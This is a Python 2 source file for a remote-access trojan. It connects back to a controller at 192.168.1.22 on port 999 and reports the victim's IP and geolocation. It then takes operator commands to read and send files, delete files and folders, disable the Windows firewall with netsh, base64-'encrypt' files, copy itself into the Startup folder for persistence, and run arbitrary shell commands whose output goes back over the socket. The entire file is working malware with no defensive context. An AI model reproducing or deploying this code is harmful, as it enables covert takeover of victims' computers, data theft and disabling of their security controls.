#coding:utf-8

import socket
import subprocess
import os
import sys
import time
import platform
from datetime import datetime
import requests
import urllib2
import json
import shutil
import urllib
import traceback
import threading
import base64


HOST = '192.168.1.22'
PORT = 999

check_system = platform.system()
check_version = platform.version()
check_machine = platform.machine()


output = requests.get('http://ipinfo.io/geo')
content = output.text
obj = json.loads(content)
ip = obj['ip']
city = obj['city']
region = obj['region']
country = obj['country']
loc = obj['loc']
postal = obj['postal']
iptracker_info = 'https://www.ip-tracker.org/locator/ip-lookup.php?ip='+ip



def do_work(forever = True):

    while True:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout( 5.0)

        x = s.getsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE)
        if ( x == 0):
            x = s.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            print 'setsockopt = ', x
        else:
            print
        
        try:
            s.connect((HOST,PORT))
            s.send('[*] CONNECTED => '+ip+'\nFor Help type "commands"')
        except socket.error:
            time.sleep(10)
            continue
        
        while 1:
            try:
                data = s.recv(16000)

                if data.startswith('quit')==True:
                    break
                else:
                    if data.startswith('cd')==True:
                        path=data[3:]
                        try:
                            os.chdir(path)
                            s.sendall(os.getcwd())
                        except:
                            s.send('[*] path not found')
                    
                    elif data.startswith('sysinfo')==True:
                        try:
                            s.sendall('SYSTEM :'+check_system+'\nVERSION : '+check_version+'\nARCH : '+check_machine+'\n')
                        except:
                            s.sendall('[*] ERROR INFOSYSTEM')
                    
                    elif data.startswith('ipgeo')==True:
                        try:
                            s.sendall('IP : '+ip+'\nCITY : '+city+'\nREGION : '+region+'\nCOUNTRY : '+country+'\nLOCATION : '+loc+'\nPOSTAL : '+postal+'\n')
                        except:
                            s.send('[*] ERROR IPGEO')
                    
                    elif data.startswith('viewtime')==True:
                        try:
                            t = datetime.now()
                            t1 = t.strftime('DAY : %a MONTH : %b %d %H:%M:%S')
                            s.sendall('TARGET TIME : '+t1)
                        except:
                            s.send('[*] ERROR VIEWTIME')

                    
                    elif data.startswith('pwd')==True:
                        try:
                            s.sendall(os.getcwd())
                        except:
                            s.send('[*] pwd : command error')
                    
                    elif data.startswith('rd')==True:
                        file2=data[3:]
                        try:
                            f = open(file2,'r')
                            content = f.read()
                            s.sendall(content)
                            f.close()
                        except:
                            s.send('[*] Error File Not Found !')
                    
                    elif data.startswith('dl')==True:
                        file3=data[3:]
                        try:
                            check_file = os.path.exists(file3)
                            if check_file ==True:
                                os.remove(file3)
                                s.send('[*] File Removed : '+file3)
                            else:
                                s.send('[*] File Not Found !')
                        except:
                            s.send('[*] Error delete module')
                    
                    elif data.startswith('targetip')==True:
                        try:
                            s.sendall('[*] IP : '+ip+'\n')
                        except:
                            s.send('[*] Error IP')
                    
                    elif data.startswith('mk')==True:
                        file4=data[3:]
                        try:
                            os.mkdir(file4)
                            check_repost = os.path.exists(file4)
                            if check_repost ==True:
                                s.send('[*] folder '+file4+' created !')
                            else:
                                s.send('[*] Folder Not Created !')
                        except:
                            s.send('[*] Exceptions Error mk module')
                    
                    elif data.startswith('df')==True:
                        file5=data[3:]
                        try:
                            check_folder = os.path.exists(file5)
                            if check_folder ==True:
                                os.rmdir(file5)
                                s.send('[*] Folder '+file5+' Removed')
                            else:
                                s.send('[*] Folder Not Found !')
                        
                        except:
                            s.send('[*] Error Module delete folder')
                    
                    elif data.startswith('kav')==True:
                        try:
                            os.system('netsh advfirewall set currentprofile state off')
                            os.system('netsh advfirewall set allprofiles state off')
                            s.send('[*] Firewall Disabled !')
                        except:
                            s.send('[*] Error Command : kav')
                    
                    elif data.startswith('ec')==True:
                        file6=data[3:]
                        try:
                            check_file_exi = os.path.isfile(file6)
                            if check_file_exi ==True:
                                f=open(file6,'rb')
                                content = f.read()
                                f.close()
                                encode=base64.b64encode(content)
                                res=content.replace(content,encode)
                                f=open(file6,'wb')
                                f.write(res)
                                f.close()
                                s.send('[*] File Encrypted '+file6+' !')
                            else:
                                s.send('[*] File Not Found !')
                        
                        except:
                            s.send('[*] Exception File Not Decoded !')
                    
                    elif data.startswith('dc')==True:
                        file7=data[3:]
                        try:
                            check_file_exis = os.path.exists(file7)
                            if check_file_exis ==True:
                                f=open(file7,'rb')
                                content = f.read()
                                f.close()
                                decode=base64.b64decode(content)
                                res=content.replace(content,decode)
                                f=open(file7,'wb')
                                f.write(res)
                                f.close()
                                s.send('[*] File Decrypted '+file7+' !')
                            else:
                                s.send('[*] File Not Found !')
                        
                        except:
                            s.send('[*] Except File Not Decoded !')
                    
                    elif data.startswith('startup')==True:
                        file8=data[3:]
                        try:
                            check_startup = os.path.exists('C:\\Users\\%UserName%\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
                            if check_startup ==True:
                                s.send('[*] Startup Found !!')
                                s.send('[*] copy exploit on Startup')
                                shutil.copy(file8, 'C:\\Users\\%UserName%\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
                                check_file_copied = os.path.exists('C:\\Users\\%UserName%\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\'+file8)

                                if check_file_copied ==True:
                                    s.send('[*] File Moved On Startup')
                                else:
                                    s.send('[*] File Not Moved On Startup')
                            else:
                                s.send('[*] Startup Location Not Found !')
                        
                        except:
                            s.send('[*] Exceptions : startup')
                    
                    elif data.startswith('uk')==True:
                        try:
                            s.sendall('[*] PREVIEW')
                        except:
                            s.sendall('[*] Error')
                    
                    elif data.startswith('pa')==True:
                        path11=data[3:]
                        try:
                            check_path11_exists = os.path.exists(path11)
                            if check_path11_exists ==True:
                                s.sendall('[*] '+path11+' Exists !')
                            else:
                                s.sendall('[*] '+path11+' Not Exists !')
                        
                        except:
                            s.sendall('[*] Module Exception pa')

                    else:
                        cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                        out = cmd.stdout.read() + cmd.stderr.read()
                        s.sendall(out)
                
            
            except socket.timeout:
                time.sleep(0)
                continue
            
            except:
                traceback.print_exc()
                break
        
        try:
            s.send('[*] EXIT SESSION '+retip+'\n')
            s.close()
        except:
            sys.exit()

if __name__ == '__main__':

    do_work(True)